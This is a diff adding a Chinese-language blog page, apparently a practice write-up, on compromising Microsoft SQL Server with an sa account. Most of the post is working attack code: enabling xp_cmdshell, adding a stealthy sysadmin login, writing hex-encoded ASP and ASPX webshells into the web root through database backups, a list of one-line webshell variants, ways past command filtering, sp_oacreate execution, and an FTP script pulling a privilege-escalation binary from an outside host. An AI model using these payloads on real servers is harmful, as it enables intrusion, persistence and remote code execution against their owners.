@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="mssql,差异备份,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="需要sa账号登录sql server数据库。 尝试系统命令：1exec xp_cmdshell &amp;apos;dir&amp;apos;">
+<meta name="keywords" content="mssql,差异备份">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mssql差异备份">
+<meta property="og:url" content="http://yoursite.com/2020/08/08/mssql差异备份/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="需要sa账号登录sql server数据库。 尝试系统命令：1exec xp_cmdshell &amp;apos;dir&amp;apos;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/dir.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/reconfigure.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/backup.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/404.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/zip下载.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/小葵.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/保存成功.jpg">
+<meta property="og:image" content="http://yoursite.com/2020/08/08/mssql差异备份/火绒.png">
+<meta property="og:updated_time" content="2021-05-05T03:55:16.134Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="mssql差异备份">
+<meta name="twitter:description" content="需要sa账号登录sql server数据库。 尝试系统命令：1exec xp_cmdshell &amp;apos;dir&amp;apos;">
+<meta name="twitter:image" content="http://yoursite.com/2020/08/08/mssql差异备份/dir.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/08/08/mssql差异备份/">
+
+
+
+
+
+  <title>mssql差异备份 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/08/mssql差异备份/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">mssql差异备份</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-08T19:19:22+08:00">
+                2020-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/基础训练/" itemprop="url" rel="index">
+                    <span itemprop="name">基础训练</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>需要sa账号登录sql server数据库。</p>
+<p>尝试系统命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &apos;dir&apos;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p><img src="/2020/08/08/mssql差异备份/dir.jpg" alt><br>这时通过下面的命令允许执行系统命令存储过程<code>sys.xp_cmdshell</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;exec sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/08/08/mssql差异备份/reconfigure.jpg" alt><br>这时再运行<code>exec xp_cmdshell &#39;dir&#39;</code>就执行了。</p>
+<p>添加一个用户，并将其放到管理员组（当前须得为sa用户）<br>（一般为了不引起警觉，不添加管理权限用户）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_addlogin system,&apos;2015dainihuiji@&apos;;</span><br><span class="line">exec master.dbo.sp_addsrvrolemember system,sysadmin;</span><br></pre></td></tr></table></figure></p>
+<h1 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h1><p>使用下面的命令对数据库进行备份：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database chayibf to disk=&apos;c:\inetpub\wwwroot\mybf.bak&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/08/08/mssql差异备份/backup.jpg" alt><br>（可以通过访问下载下来。）<br>&lt;%blockquote%&gt;<br>tips：这里如果禁止访问bak后缀的文件，可以将其保存成zip后缀再下载，然后改名字。一般对zip不会做过多限制。<br>&lt;%endblockquote%&gt;<br><img src="/2020/08/08/mssql差异备份/404.jpg" alt><br><img src="/2020/08/08/mssql差异备份/zip下载.jpg" alt></p>
+<h1 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a>差异备份</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backup database chayibf to disk=&apos;c:\inetpub\wwwroot\mybf1.asp&apos; with differential,format;</span><br></pre></td></tr></table></figure>
+<p>在不知道数据库名的情况下，可以用下面的存储过程来备份：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @a sysname;<span class="keyword">set</span> @a=db_name();<span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=<span class="string">'c:\inetpub\wwwroot\mybf2.rar'</span>;</span><br><span class="line"><span class="keyword">declare</span> @a sysname;<span class="keyword">set</span> @a=db_name();<span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=<span class="string">'c:\inetpub\wwwroot\mybf2.rar'</span> <span class="keyword">with</span> differential,<span class="keyword">format</span>;</span><br></pre></td></tr></table></figure>
+<!--执行powershell命令：-->
+<p>创建临时表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> temp(<span class="keyword">id</span> <span class="keyword">nvarchar</span>(<span class="number">255</span>),numl <span class="keyword">nvarchar</span>(<span class="number">255</span>),num2 <span class="keyword">nvarchar</span>(<span class="number">255</span>),num3 <span class="keyword">nvarchar</span>(<span class="number">255</span>));<span class="comment">--</span></span><br><span class="line">;<span class="keyword">insert</span> temp exec master.dbo.xp_availablemedia;<span class="comment">--</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> temp</span><br></pre></td></tr></table></figure>
+<p>有时入侵检测会禁止使用xp_cmdshell命令，这时可以<strong>拆分命令</strong>或者<strong>对其进行编码</strong>。<br><strong>拆分命令</strong><br>一般对于存储过程不是数据库中的变量都设置成<code>sysname</code>。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname <span class="keyword">set</span> @a=<span class="string">'xp_cmdshell'</span> exec @a <span class="string">'dir c:\';</span></span><br></pre></td></tr></table></figure></p>
+<p>拆分成下面的语句绕过：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname <span class="keyword">set</span> @a=<span class="string">'xp_'</span>+<span class="string">'cmdshell'</span> exec @a <span class="string">'dir c:\'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>对其进行编码并利用差异备份写入webshell</strong><br>小葵转换工具：<br><img src="/2020/08/08/mssql差异备份/小葵.jpg" alt><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">declare</span> @a sysname,@s <span class="keyword">nvarchar</span>(<span class="number">4000</span>) <span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C0063006F006F006E006600690067002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s;</span><br><span class="line">;<span class="keyword">create</span> <span class="keyword">table</span> [dbo].[cmd] ([cmd] [image]);</span><br><span class="line">;<span class="keyword">insert</span>  <span class="keyword">into</span> cmd(cmd) <span class="keyword">values</span>(<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>);</span><br><span class="line">;<span class="keyword">select</span> @a=db_name(),@s=<span class="number">0x63003A005C0069006E00650074007000750062005C0077007700770072006F006F0074005C006900690069006E006400650078002E00610073007000</span> <span class="keyword">backup</span> <span class="keyword">database</span> @a <span class="keyword">to</span> disk=@s <span class="keyword">with</span> differential,<span class="keyword">format</span>;</span><br><span class="line">;<span class="keyword">drop</span> <span class="keyword">table</span> cmd</span><br></pre></td></tr></table></figure></p>
+<p>&lt;%blockquote%&gt;<br>带有<code>00</code>的称为sql_encode，是sql专有的encode方式；而写入木马插入值的values为hex编码。虽然都是0x开头，但二者编码方式不同。<br>&lt;%endblockquote%&gt;<br><img src="/2020/08/08/mssql差异备份/保存成功.jpg" alt></p>
+<h1 id="log增量备份"><a href="#log增量备份" class="headerlink" title="log增量备份"></a>log增量备份</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test01.asp'</span> <span class="keyword">with</span> init<span class="comment">--</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test02.asp'</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> cmd<span class="comment">--</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> SIMPLE<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">database</span> chayibf <span class="keyword">set</span> <span class="keyword">RECOVERY</span> <span class="keyword">FULL</span>;<span class="comment">--</span></span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">table</span> cmd;<span class="comment">--</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image,<span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">IDENTITY</span> (<span class="number">1</span>,<span class="number">1</span>)); <span class="comment">--添加了个自动编号的字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span>(<span class="number">0x3C25402050616765204C616E67756167653D224A73637269707422253E3C256576616C28526571756573742E4974656D5B227A225D2C22756E7361666522293B253E</span>);<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">database</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test01.aspx'</span> <span class="keyword">with</span> init;<span class="comment">--</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test03.aspx'</span> <span class="keyword">with</span> init;<span class="comment">--</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> cmd <span class="keyword">where</span> <span class="keyword">id</span>&gt;<span class="number">1</span>;<span class="comment">--删除id&gt;1的数据</span></span><br><span class="line"><span class="keyword">backup</span> <span class="keyword">log</span> chayibf <span class="keyword">to</span> disk = <span class="string">'c:\inetpub\wwwroot\test02.aspx'</span>;</span><br></pre></td></tr></table></figure>
+<p>一句话马的其他写法：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a)&lt;%%25Execute(request("a"))%%25&gt;</span><br><span class="line">b)&lt;%Execute(request("a"))%&gt;</span><br><span class="line">c)%&gt;&lt;%execute request("a")%&gt;&lt;%</span><br><span class="line">d)&lt;script language=VBScript runat=server&gt;execute request("a")&lt;/script&gt;</span><br><span class="line">e)&lt;%25Execute(request("a"))%25&gt;</span><br><span class="line">f)&lt;%eval(request("a")):response.end%&gt;   备分专用一句话   (也就是插入一句话后所有的代码都无效,在一句话这里打止)</span><br><span class="line">g)"%&gt;&lt;%eval (request (chr(309)))%&gt;&lt;%'"  网站配置版权信息插马专用一句话</span><br><span class="line">h)&lt;%On Error Resume Next:response.clear:execute request("value"):response.End%&gt;</span><br><span class="line">i)&lt;%eval request(0)%&gt;</span><br><span class="line">j)"%&gt;&lt;%Eval Request(0)%&gt;  网站配置版权信息插马专用一句话</span><br></pre></td></tr></table></figure></p>
+<p>通过echo写入一句话：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell 'echo "&lt;?php phpinfo();?&gt;" &gt;d:\xampp\htdocs\test.php'</span><br></pre></td></tr></table></figure></p>
+<p>xp_cmdshell被过滤时：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @a <span class="built_in">varchar</span>(<span class="number">1024</span>);<span class="keyword">set</span> @a=<span class="keyword">cast</span>(<span class="number">0x657865632078705F636D647368656C6C202764697227</span> <span class="keyword">as</span> <span class="built_in">varchar</span>(<span class="number">1024</span>));exec (@a);<span class="comment">--</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="sp-oacreate执行技术"><a href="#sp-oacreate执行技术" class="headerlink" title="sp_oacreate执行技术"></a>sp_oacreate执行技术</h1><p>当没有xp_cmdshell的时候，可以使用sp_oacreate执行命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;exec sp_configure &apos;Ole Automation Procedures&apos;,1;RECONFIGURE;</span><br><span class="line">--创建wscript.shell对象</span><br><span class="line">use master declare @o int exec sp_oacreate &apos;wscript.shell&apos;,@o out exec sp_oamethod @o,&apos;run&apos;,null,&apos;cmd /c &quot;net user&quot; &gt; c:\inetpub\wwwroot\test.txt&apos;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/08/08/mssql差异备份/火绒.png" alt></p>
+<p>操作cmd.exe被拦截了…</p>
+<h2 id="通过sp-oacreate操作FTP"><a href="#通过sp-oacreate操作FTP" class="headerlink" title="通过sp_oacreate操作FTP"></a>通过sp_oacreate操作FTP</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> @o <span class="built_in">int</span>, @f <span class="built_in">int</span>, @t <span class="built_in">int</span>, @ret <span class="built_in">int</span></span><br><span class="line">exec sp_oacreate <span class="string">'scripting.filesystemobject'</span>, @o <span class="keyword">out</span></span><br><span class="line">exec sp_oamethod @o, <span class="string">'createtextfile'</span>, @f <span class="keyword">out</span>, <span class="string">'C:\1.bat'</span>, <span class="number">1</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span>,<span class="string">'open IP'</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span>,<span class="string">'ftp账号'</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span>,<span class="string">'ftp密码'</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span>,<span class="string">'get en.exe（无net提权脚本）c:\en.exe'</span></span><br><span class="line">exec @ret = sp_oamethod @f, <span class="string">'writeline'</span>, <span class="literal">NULL</span>,<span class="string">'bye'</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mssql/" rel="tag"># mssql</a>
+          
+            <a href="/tags/差异备份/" rel="tag"># 差异备份</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/28/SQL-Server存储过程排序算法/" rel="next" title="SQL Server存储过程排序算法">
+                <i class="fa fa-chevron-left"></i> SQL Server存储过程排序算法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/10/一次上传练习/" rel="prev" title="一次上传练习">
+                一次上传练习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#备份数据库"><span class="nav-number">1.</span> <span class="nav-text">备份数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#差异备份"><span class="nav-number">2.</span> <span class="nav-text">差异备份</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#log增量备份"><span class="nav-number">3.</span> <span class="nav-text">log增量备份</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sp-oacreate执行技术"><span class="nav-number">4.</span> <span class="nav-text">sp_oacreate执行技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#通过sp-oacreate操作FTP"><span class="nav-number">4.1.</span> <span class="nav-text">通过sp_oacreate操作FTP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
